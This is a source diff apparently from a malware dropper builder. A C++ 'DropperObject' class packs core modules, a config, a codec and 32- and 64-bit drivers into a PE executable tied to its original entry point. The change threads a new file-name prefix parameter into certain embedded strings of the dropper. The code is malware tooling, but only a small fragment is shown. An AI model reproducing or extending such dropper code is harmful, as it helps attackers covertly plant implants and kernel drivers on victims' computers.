@@ -40,7 +40,7 @@ DropperObject::DropperObject(PEObject& pe)
 	_exeType = _pe.exeType;
 }
 
-DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint )
+DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint, std::string fPrefix )
 {
 	DWORD dataBufferSize = 0;
 	
@@ -81,15 +81,21 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint )
 	// Strings
 	header->strings.offset = ptr - _data.get();
 	
+	unsigned int idx=0;
 	for ( std::list<std::string>::iterator iter = _strings.begin();
 		iter != _strings.end(); 
-		iter++ )
+		iter++, idx++ )
 	{
 		// store offset of string
 		(*strOffset) = ptr - (header->strings.offset + _data.get()); strOffset++;
 		
 		// store string data
 		(void) memcpy( ptr, (*iter).c_str(), (*iter).size() + 1);
+
+		if (idx == STRIDX_COMMAHFF8)
+			memcpy(ptr+2, fPrefix.c_str(), fPrefix.size());
+		else if (idx == STRIDX_HFF5)
+			memcpy(ptr, fPrefix.c_str(), fPrefix.size());
 		
 		ptr += (*iter).size() + 1;
 	}
@@ -353,7 +359,7 @@ bool DropperObject::_readFile( std::string path, NamedFileBuffer& buffer )
 	return true;
 }
 
-bool DropperObject::build( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir )
+bool DropperObject::build( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir, std::string fPrefix )
 {
 	try {
 		_setExecutableName("XXX");
@@ -374,7 +380,7 @@ bool DropperObject::build( bf::path core, bf::path core64, bf::path config, bf::
 		if (!driver64.empty())
 			_addDriver64File(driver64.string(), driver64.filename());
 		
-		_build( (WINSTARTFUNC) _pe.epVA() );
+		_build( (WINSTARTFUNC) _pe.epVA(), fPrefix );
 		
 	} catch (...) {
 		cout << __FUNCTION__ << "Failed building dropper object." << endl;
